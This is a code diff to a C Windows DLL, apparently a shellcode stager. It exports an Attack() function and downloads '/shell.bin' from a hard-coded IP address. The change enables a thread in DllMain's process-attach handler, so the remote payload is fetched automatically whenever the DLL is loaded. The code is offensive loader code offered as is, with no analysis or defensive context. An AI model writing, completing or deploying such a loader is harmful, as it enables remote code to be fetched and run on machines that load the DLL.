@@ -2,8 +2,8 @@
 #include "common.h"
 
 unsigned char* pPayload = NULL;
-PSTR url = "192.168.139.132";
-PSTR endpoint = "/shell.bin";
+PWSTR url = L"192.168.231.133";
+PWSTR endpoint = L"/shell.bin";
 SIZE_T sSize = -1;
 
 extern __declspec(dllexport) int Attack()
@@ -41,12 +41,7 @@ extern __declspec(dllexport) int Attack()
     return 0;
 }
 
-extern __declspec(dllexport) int fetch()
-{
-    Download(&pPayload, url, endpoint, FALSE);
-}
-
-DWORD WINAPI fetch_payload(LPVOID lpParam)
+EXTERN_C DWORD fetch_payload()
 {
     sSize = Download(&pPayload, url, endpoint, FALSE);
     return sSize;
@@ -58,15 +53,15 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
     {
         case DLL_PROCESS_ATTACH: {
             //sSize = Download(&pPayload, url, endpoint, FALSE);
-            //__debugbreak();
-           /* WaitForSingleObject(CreateThread(NULL, 0, fetch_payload, NULL,0,NULL ), INFINITE);
-
+            //WaitForSingleObject(CreateThread(NULL, 0, fetch_payload, NULL,0,NULL ), INFINITE);
+            //fetch_payload();
+            CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
             if (sSize == -1)
             {
                 printf("[!] Failed to fetch payload from server!\n");
                 return FALSE;
             }
-            break;*/
+            break;
         }
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
